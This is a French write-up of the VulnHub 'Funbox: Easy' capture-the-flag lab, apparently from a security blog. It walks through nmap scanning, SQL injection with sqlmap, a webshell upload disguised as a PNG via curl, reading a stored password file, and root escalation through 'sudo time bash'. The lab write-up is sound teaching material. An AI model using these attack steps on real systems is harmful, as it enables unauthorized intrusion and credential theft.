---
title: Solution du CTF Funbox Easy de VulnHub
tags: [CTF, VulnHub]
---

### L'enfer est pavé de CTFs cassés

[Funbox: Easy](https://vulnhub.com/entry/funbox-easy,526/) est présenté comme un CTF simple... normalement.

La particularité du CTF c'est le nombre de webapps vulnérables qui font qu'on ne sait pas trop où se concentrer.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.122
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.122
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
--- snip ---
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /admin/: 
|     PHPSESSID: 
|       httponly flag not set
|   /admin/index.php: 
|     PHPSESSID: 
|       httponly flag not set
|   /store/: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /secret/: Potentially interesting folder
|_  /store/: Potentially interesting folder
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
--- snip ---
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: 08:00:27:9A:06:51 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
```

Commençons par la zone `/admin` qui a le titre HTML `Small CRM Projects`. Une recherche sur exploit-db remonte plusieurs vulnérabilités pour un logiciel nommé `Small CRM`, dont une faille de bypass d'authentification : [Small CRM 2.0 - Authentication Bypass - PHP webapps Exploit](https://www.exploit-db.com/exploits/47874).

Effectivement, on peut bypasser l'authentification de manière classique, mais une fois connecté, je ne trouve rien pour faire levier pour obtenir un shell. Je lance donc `sqlmap` sur la faille SQL :

```bash
sqlmap  -u http://192.168.56.122/admin/index.php --data "email=yolo&password=yolo&login=" --dbms mysql --risk 3 --level 5
```

Les identifiants `admin` sont dans une table spécifique alors que les autres comptes dans une autre table :

```
Database: crm
Table: admin
[1 entry]
+----+--------+--------------+
| id | name   | password     |
+----+--------+--------------+
| 1  | admin  | asdfghjklXXX |
+----+--------+--------------+
```

J'ai ensuite énuméré dans ce dossier, mais toujours rien. Je suis ensuite passé sur le `store ̣`. Ce dernier a une section d'administration et `admin` / `admin` est accepté.

On peut éditer et supprimer des entrées pour des livres et uploader des fichiers... sauf que l'upload est cassé, les fichiers n'apparaissent pas à l'endroit où ils sont censés se retrouver.

Je suis donc passé une nouvelle fois à sqlmap :

```bash
sqlmap -u "http://192.168.56.122/store/book.php?bookisbn=978-1-49192-706-9" --dbms mysql --risk 3 --level 5 -D store -T customers --dump
```

Tout ce que j'ai eu, c'est le hash pour l'utilisateur `admin` dont j'ai déjà le mot de passe.

```console
Database: store
Table: admin
[1 entry]
+------------------------------------------+--------+
| pass                                     | name   |
+------------------------------------------+--------+
| d033e22ae348aeb5660fc2140aec35850c4da997 | admin  |
+------------------------------------------+--------+
```

Le fichier `robots.txt` avait une entrée pour `/gym`. Il y a beaucoup de chose dans ce dossier comme des sous-dossiers avec des scripts qui semblent en doublon. J'ai trouvé 3 scripts d'upload là-dedans, mais tous étaient cassés.

```console
301        9l       28w      322c http://192.168.56.122/gym/profile
200        4l       20w      137c http://192.168.56.122/gym/register.php
301        9l       28w      320c http://192.168.56.122/gym/admin
301        9l       28w      321c http://192.168.56.122/gym/upload
200        0l        0w        0c http://192.168.56.122/gym/upload.php
200      133l      309w     4848c http://192.168.56.122/gym/index.php
200      121l      278w     4282c http://192.168.56.122/gym/edit.php
200        0l        0w        0c http://192.168.56.122/gym/up.php
200      168l      487w     7624c http://192.168.56.122/gym/packages.php
301        9l       28w      322c http://192.168.56.122/gym/include
200      141l      442w     5248c http://192.168.56.122/gym/about.php
301        9l       28w      318c http://192.168.56.122/gym/img
500        0l        0w        0c http://192.168.56.122/gym/home.php
200      122l      501w     5837c http://192.168.56.122/gym/facilities.php
200      116l      272w     4104c http://192.168.56.122/gym/contact.php
200      339l     2953w    18025c http://192.168.56.122/gym/LICENSE
200      113l      268w     4252c http://192.168.56.122/gym/Feedback.php
301        9l       28w      318c http://192.168.56.122/gym/att
200       27l       54w      816c http://192.168.56.122/gym/att.php
301        9l       28w      317c http://192.168.56.122/gym/ex
301        9l       28w      319c http://192.168.56.122/gym/boot
500        0l        0w        0c http://192.168.56.122/gym/editp.php
```

Pourtant, une faille d'upload existe belle et bien :

[Gym Management System 1.0 - Unauthenticated Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/48506)

Grosso-modo il aurait fallut faire ça :

```bash
curl -s -D- "http://192.168.56.122/gym/upload.php?id=hello" -X POST -F 'file=@sh.php.png;type=image/png' -F "pupload=upload"
```

Puis à force de fouiller, la VM ne voulait plus rien savoir : temps de réponse anormalement long, connexion impossible des applis sur le serveur MySQL après reboot...

Bref, la VM était cassée, sans doute que les logs ont bouffé tout l'espace disque.

### Fastoche

Une fois la VM supprimée et réimportée, l'upload depuis la gestion des livres (`/store`) fonctionnait sans problème et sans aucune restriction.

Après le webshell, je suis passé à reverse-ssh et l'escalade de privilèges a été aisée :

```console
www-data@funbox3:~$ ls /home/
tony
www-data@funbox3:~$ find / -user tony -ls 2> /dev/null 
   268716      4 drwxr-xr-x   3 tony     tony         4096 Jul 31  2020 /home/tony
   268743      4 -rw-r--r--   1 tony     tony         3771 Feb 25  2020 /home/tony/.bashrc
   269494      4 -rw-------   1 tony     tony         1576 Jul 31  2020 /home/tony/.viminfo
   268744      4 -rw-r--r--   1 tony     tony          807 Feb 25  2020 /home/tony/.profile
   269493      4 -rw-rw-r--   1 tony     tony           70 Jul 31  2020 /home/tony/password.txt
   269495      4 -rw-------   1 tony     tony           30 Jul 31  2020 /home/tony/.bash_history
   268780      0 -rw-r--r--   1 tony     tony            0 Jul 30  2020 /home/tony/.sudo_as_admin_successful
   268778      4 drwx------   2 tony     tony         4096 Jul 30  2020 /home/tony/.cache
   268745      4 -rw-r--r--   1 tony     tony          220 Feb 25  2020 /home/tony/.bash_logout
www-data@funbox3:~$ cat /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
www-data@funbox3:~$ su tony
Password: 
tony@funbox3:/var/www/html$ id
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
tony@funbox3:/var/www/html$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
tony@funbox3:/var/www/html$ sudo /usr/bin/time bash
root@funbox3:/var/www/html# cd
root@funbox3:~# ls
root.flag  snap
root@funbox3:~# cat root.flag 
 __________          ___.                      ___________                     
\_   _____/_ __  ____\_ |__   _______  ___ /\  \_   _____/____    _________.__.
 |    __)|  |  \/    \| __ \ /  _ \  \/  / \/   |    __)_\__  \  /  ___<   |  |
 |     \ |  |  /   |  \ \_\ (  <_> >    <  /\   |        \/ __ \_\___ \ \___  |
 \___  / |____/|___|  /___  /\____/__/\_ \ \/  /_______  (____  /____  >/ ____|
     \/             \/    \/            \/             \/     \/     \/ \/     
                                                                        
Made with ❤ from twitter@0815R2d2. Please, share this on twitter if you want.
```

J'ai jeté un œil pour comprendre pourquoi les attaques sur les scripts d'upload dans `/gym` échouaient. Il s'avère que les fichiers appartiennent à `root` et ne sont pas modifiables pour `www-data` :

```console
root@funbox3:/var/www/html# ls -ald gym/upload
drwxr-xr-x 2 root root 4096 Nov 22  2018 gym/upload
```
